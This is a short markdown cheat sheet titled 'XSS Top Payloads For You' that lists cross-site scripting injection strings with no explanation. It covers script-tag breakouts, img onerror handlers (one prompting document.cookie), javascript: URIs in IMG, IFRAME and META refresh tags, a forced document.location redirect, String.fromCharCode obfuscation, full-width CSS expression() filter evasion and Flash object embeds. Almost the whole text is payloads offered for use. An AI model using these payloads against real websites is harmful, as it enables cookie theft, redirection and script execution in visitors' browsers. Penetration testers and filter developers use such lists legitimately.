## XSS Top Payloads For You.

````<script>alert("XSS")</script>
%3E%3C/scRipt%3E%3CscRipt%3Ealert('XSSPOSED')%3C/scRipt%3E";alert(1)//'-alert(1)-'"
...
<IMG SRC=javascript:alert('XSS')>">
<img src=x onerror=prompt(document.cookie)><h1 onerror=alert(/@0x6D6172696F/)>XSS BY ALEX</h1><style>*:after{content:url()}</style>"><script>document.location.href="http://www.google.com"</script>
<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
<input value=”abc”> into <input value=”abc”><script>alert(9)</script><””>
<IMG SRC=JaVaScRiPt:alert('XSS')>
<IMG SRC=javascript:alert(&quot;XSS&quot;)>
...
<META HTTP-EQUIV"'><img src=x onerror=confirm(3);>
...
</SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>="refresh" CONTENT="0;url=javascript:alert('XSS');">
...
"><script>alert(1)</script>
'><script>alert(1)</script></iframe></option>
...
"><object allowscriptaccess="always" data="test.swf"></object>
'><object allowscriptaccess="always" data="test.swf"></object>
<style>*{x:ｅｘｐｒｅｓｓｉｏｎ(alert(1))}</style>
"><style>*{x:ｅｘｐｒｅｓｓｉｏｎ(alert(1))}</style>
'><style>*{x:ｅｘｐｒｅｓｓｉｏｎ(alert(1))}</style>
